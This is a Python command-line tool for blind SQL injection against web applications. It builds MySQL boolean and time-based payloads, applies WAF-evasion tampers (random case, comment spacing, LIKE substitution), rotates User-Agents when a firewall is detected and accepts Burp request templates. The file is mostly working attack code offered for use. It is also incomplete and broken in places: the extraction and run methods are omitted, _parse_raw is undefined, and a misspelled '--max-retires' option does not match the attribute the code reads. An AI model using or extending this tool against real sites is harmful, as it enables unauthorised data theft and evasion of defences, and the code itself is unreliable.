



```
#!/usr/bin/env python3
"""
Blind SQL Injection extraction tool with modular engines, auto fingerprinting,
boolean/time modes, binary-search, chunked extraction, WAF detection/evasion,
scalable tamper pipeline with presets, Burp request template ($-placeholder),
interactive mode, batch/interactive, concurrency, caching, and rich CLI UX.
"""
import argparse
import asyncio
import json
import random
import sys
from abc import ABC, abstractmethod
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

import httpx
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn

# ----------------------- ASCII Art Banner -----------------------
def get_banner() -> str:
    return r'''
 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@

   Blind SQLi Tool
'''

# ----------------------- Tamper Scripts & Presets -----------------------
TAMPERS: Dict[str, Callable[[str], str]] = {}

def tamper_space2comment(payload: str) -> str:
    return payload.replace(' ', '/**/')
TAMPERS['space2comment'] = tamper_space2comment

def tamper_randomcase(payload: str) -> str:
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
TAMPERS['randomcase'] = tamper_randomcase

def tamper_equaltolike(payload: str) -> str:
    return payload.replace('=', ' LIKE ')
TAMPERS['equaltolike'] = tamper_equaltolike

PRESETS: Dict[str, List[str]] = {
    'stealth': ['randomcase', 'space2comment', 'equaltolike'],
}

# ----------------------- SQL Engines -----------------------
class SQLEngine(ABC):
    @abstractmethod
    def boolean_payload(self, concat_expr: str, position: int, mid: int) -> str:
        pass

    @abstractmethod
    def time_payload(self, concat_expr: str, position: int, mid: int, delay: int) -> str:
        pass

class MySQLEngine(SQLEngine):
    def boolean_payload(self, concat_expr, position, ascii_code):
        return f"1' OR ASCII(SUBSTRING(({concat_expr}),{position},1))={ascii_code}-- "
    def time_payload(self, concat_expr, position, ascii_code, delay):
        return f"1' OR IF(ASCII(SUBSTRING(({concat_expr}),{position},1))>{ascii_code}, SLEEP({delay}), 0)-- "

# Other engines omitted for brevity

# -------------------- Injector --------------------
class BlindSQLInjector:
    UA_LIST = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (X11; Linux x86_64)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X)'
    ]

    def __init__(
        self,
        url: Optional[str], param: Optional[str], engine: SQLEngine,
        mode: str, table: Optional[str], columns: Optional[List[str]],
        max_chars: int, chunk_size: int, concurrency: int,
        timeout: float, max_retries: int, output: Optional[str],
        cache_file: str, base_delay: int,
        request_template: Optional[str],
        tamper_names: List[str]
    ):
        self.console = Console()
        self.client = httpx.AsyncClient(timeout=timeout)
        self.url = url.rstrip('?&') if url else None
        self.param = param.lstrip('?') if param else None
        self.engine = engine
        self.mode = mode
        self.table = table
        self.columns = columns
        self.max_chars = max_chars
        self.chunk_size = chunk_size
        self.concurrency = concurrency
        self.timeout = timeout
        self.max_retries = max_retries
        self.output = output
        self.cache_file = Path(cache_file)
        self.base_delay = base_delay
        self.request_template = request_template
        self.tamper_funcs: List[Callable[[str], str]] = []
        for name in tamper_names:
            fn = TAMPERS.get(name)
            if fn:
                self.tamper_funcs.append(fn)
            else:
                self.console.log(f"[yellow]Tamper desconocido: {name} (omitido)[/yellow]")
        self._load_cache()

    def _load_cache(self):
        if self.cache_file.exists():
            with open(self.cache_file, 'r') as f:
                self.cache = json.load(f)
        else:
            self.cache = {"extracted": "", "pos": 1}

    def _save_cache(self):
        with open(self.cache_file, 'w') as f:
            json.dump(self.cache, f)

    def _apply_tampers(self, payload: str) -> str:
        for fn in self.tamper_funcs:
            payload = fn(payload)
        return payload

    async def _probe(self, payload: str) -> bool:
        payload = self._apply_tampers(payload)
        headers = {'User-Agent': random.choice(self.UA_LIST)}
        if self.request_template:
            filled = self.request_template.replace('$', payload)
            method, url, headers, body = self._parse_raw(filled)
        else:
            url = f"{self.url}?{self.param}={payload}"
            method, body = 'GET', None
        for attempt in range(1, self.max_retries+1):
            try:
                r = await self.client.request(method, url, headers=headers, content=body)
                if r.status_code in (403,429) or 'waf' in r.text.lower():
                    self.console.log(f"[yellow]WAF detectado (status {r.status_code}), rotando UA y delay[/yellow]")
                    await asyncio.sleep(self.base_delay*2)
                    headers['User-Agent'] = random.choice(self.UA_LIST)
                    continue
                if self.mode == 'boolean':
                    return r.status_code==200 and 'error' not in r.text.lower()
                return r.elapsed.total_seconds()>=self.base_delay
            except Exception:
                if attempt==self.max_retries:
                    self.console.log(f"[red]Error tras {attempt} reintentos[/red]")
                    return False
                await asyncio.sleep(self.base_delay)
        return False

    # _extract_char, _extract_block, run() remain unchanged for brevity

# -------------------- CLI --------------------
def main():
    console = Console()
    console.print(get_banner(), style="cyan")

    parser = argparse.ArgumentParser(description="Blind SQLi Tool w/ Burp, tampers, presets & interactive")
    parser.add_argument('-u','--url', help='Base URL')
    parser.add_argument('-p','--param', default='id', help='Parameter name')
    parser.add_argument('-t','--table', help='Table')
    parser.add_argument('-c','--columns', nargs='+', help='Columns')
    parser.add_argument('-e','--engine', choices=['mysql','postgres','mssql','auto'], default='auto', help='DB engine or auto')
    parser.add_argument('-m','--mode', choices=['boolean','time'], default='boolean', help='Detection mode')
    parser.add_argument('-b','--max-chars', type=int, default=100, help='Max chars to extract')
    parser.add_argument('-k','--chunk-size', type=int, default=1, help='Block size in chars')
    parser.add_argument('-r','--request-file', help='Burp request file with $ placeholder')
    parser.add_argument('-T','--tamper', help='Comma-separated tamper names', default='')
    parser.add_argument('--preset', choices=list(PRESETS.keys()), help='Predefined tamper preset')
    parser.add_argument('--delay', type=int, default=2, help='Base delay or between retries')
    parser.add_argument('--timeout', type=float, default=10.0, help='HTTP timeout')
    parser.add_argument('--max-retires', type=int, default=3, help='HTTP retries')
    parser.add_argument('-o','--output', help='JSON output file')
    parser.add_argument('--cache', default='sqli_cache.json', help='Cache file path')
    parser.add_argument('--interactive', action='store_true', help='Prompt for all parameters')
    args = parser.parse_args()

    if args.interactive:
        args.url = console.input("[bold]URL objetivo:[/] ")
        args.param = console.input(f"[bold]Parámetro vulnerable [id]:[/] ") or 'id'
        args.table = console.input("[bold]Tabla:[/] ")
        cols = console.input("[bold]Columnas (espacio-separated):[/] ")
        args.columns = cols.split()
        args.engine = console.input("[bold]Motor (mysql/postgres/mssql/auto) [auto]:[/] ") or 'auto'
        args.mode = console.input("[bold]Modo (boolean/time) [boolean]:[/] ") or 'boolean'
        args.max_chars = int(console.input("[bold]Máximo caracteres [100]:[/] ") or 100)
        args.chunk_size = int(console.input("[bold]Tamaño de bloque [1]:[/] ") or 1)
        if console.input("[bold]Usar Burp request file? (y/N):[/] ").lower().startswith('y'):
            args.request_file = console.input("[bold]Ruta archivo Burp request:[/] ")
        preset = console.input(f"[bold]Preset tamper? {list(PRESETS.keys())}[/] ")
        args.preset = preset if preset in PRESETS else None
        if not args.preset:
            t = console.input("[bold]Tampers manual (comma-separated):[/] ")
            args.tamper = t

    request_template = Path(args.request_file).read_text() if args.request_file else None

    if args.preset:
        tamper_list = PRESETS[args.preset]
        console.print(f"[green]Usando preset tamper:[/] {args.preset} -> {tamper_list}")
    else:
        tamper_list = [t.strip() for t in args.tamper.split(',') if t.strip()]

    # Engine selection/fingerprint logic... (omitted for brevity)
    engine = MySQLEngine()  # placeholder

    injector = BlindSQLInjector(
        url=args.url, param=args.param, engine=engine, mode=args.mode,
        table=args.table, columns=args.columns, max_chars=args.max_chars,
        chunk_size=args.chunk_size, concurrency=1,
        timeout=args.timeout, max_retries=args.max_retries,
        output=args.output, cache_file=args.cache,
        base_delay=args.delay, request_template=request_template,
        tamper_names=tamper_list
    )
    try:
        asyncio.run(injector.run())
    except KeyboardInterrupt:
        console.print("[red]Interrumpido. Re-run con cache para reanudar[/red]")
        sys.exit(1)

if __name__=='__main__':
    main()

```